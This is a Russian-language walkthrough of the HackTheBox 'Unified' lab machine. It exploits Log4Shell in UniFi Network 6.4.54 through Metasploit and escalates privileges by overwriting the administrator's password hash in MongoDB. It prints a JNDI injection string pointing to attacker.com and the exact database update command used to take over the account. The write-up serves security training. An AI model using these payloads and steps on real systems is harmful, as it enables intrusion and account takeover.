# HTB Starting Point Tier 2: Unified

- **Difficulty:** Very Easy
- **Дата:** 12.01.2026
- **Цель:** Практика базового enumeration и простого эксплойта Log4Shell.

## 1. Recon & Enumeration
`nmap -sV -sV -v -T4 10.129.96.149`. `Открытые порты: 22, 6789, 8080, 8443`. Порт 8080 (HTTP) открыт, и мы переходим по `http://ip:8080`, нас редиректит на `https://ip:8443/manage/account/login?redirect=%2Fmanage`, и из названия страницы, мы получаем ответ на второй вопрос — `UniFi Network 6.4.54`.

Находим `CVE-2021-44228`, известную также как Log4Shell. Она позволяет нам выполнить произвольный код на сервере путём отправки специально crafted строки в логируемые данные, такие как HTTP-заголовки или параметры форм. При JNDI-инъекции основным протоколом, который используют злоумышленники, является LDAP (Lightweight Directory Access Protocol). Злоумышленник отправляет строку в поле, которое приложение обязательно запишет в лог (например, User-Agent в HTTP-заголовке или поле «Имя пользователя»): `${jndi:ldap://attacker.com}`.

По умолчанию приложение UniFi Network использует TCP-порт 27117 для работы своей встроенной базы данных MongoDB. Ubiquiti использует порт 27117 вместо стандартного для MongoDB (27017), чтобы избежать конфликтов с другими экземплярами баз данных, которые могут быть запущены на том же сервере, но это мы можем предположить только из теории, на практике же мы сможем это проверить чуть позже.

## 2. Exploitation
Для эксплуатации уязвимости воспользуемся Metasploit: `msfconsole`, внутри которой есть удобный поиск по CVE: `search CVE:2021-44228`, где нас интересует `exploit/multi/http/ubiquiti_unifi_log4shell`. Остается только настроить необходимые параметры в `options` такие как RHOST, SRVHOST, LHOST и запустить эксплойт командой `run`. И вуаля, мы в системе как `unifi`. Чтобы обновить терминальную оболочку вводим команду script `/dev/null -c bash` и можно двигаться дальше. Командой `ps aux | grep mongo` мы убеждаемся, что MongoDB работает на порту 27117, и успешно отвечаем на задание 8

## 3. Privilege Escalation
Вот тут начинается самое интересное, если бы не Guided Mode площадки HTB, то я бы пошел стандартным pipeline'ом поиска повышений привелегий, шпаргалка которой, кстати, есть в моем репозитории, [тык!](https://github.com/tim-karov/cybersec-notes/blob/cc54b5e44ec018098a1b8d9dc3f343aeb0e25b8b/cheatsheets/linux-priv-esc.md).

Коннектимся к MongoDB: `mongo --port 27177`, выводим все базы данных: `show dbs`, и получаем базу данных `ace`, которая и является овтетом на следующий вопрос. Так как мы будем искать пользователя с более высокими привилегиями, то функция будет выглядить следующим образом: `db.admin.find()`, а функция обновления пользователя: `db.admin.update()`. Вооружившись этой информацией, едем дальше. Командой: `mongo --port 27117 ace --eval "db.admin.find()"` находим в первой строке пользователя administrator у которого виден хеш пароля, и так как в задании есть функция update, не думаю, что хорошей идеей будет пробовать взломать его через john или еще какие-то утилиты взлома.

Скопировав текущий хеш и прогнав его через [Hash ID](https://github.com/blackploit/hash-identifier/blob/master/hash-id.py), узнал, что текущий алгоритм шифрования пароля SHA-512, давайте сгенерируем новый пароль с таким же алгоритмом: `mkpasswd -m sha-512 qwerty12345`. Окей, мы сгенерировали новый пароль, теперь будем пробовать его обновлять: `mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"хеш нового пароля"}})'`, и получаем заветное: `WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })`

Бежим в изначальную веб-форму авторизации, вводим логин и новоиспеченный пароль.. Ура! Мы внутри. Казалось бы где-то тут должен и быть root-флаг, но нет.. В долгих поисках, что же тут может быть полезным, слева на панели нажимаем `Settings > Site`, и о чудо, мы получаем креды root-пользователя! Дальше, думаю, вы и так знаете что делать, подключаемся по ssh и находим долгожданный root-флаг, ну и заодно и user-флаг, хотя его можно было взять и раньше!

## Done
Флаги взяты, всем спасибо! Не сказал бы, что это тачка **Very Easy**, без гуглежа, и большого количества попыток, с первого раза взять ее было довольно-таки сложно, но я справился, машинка интересная, лайк!
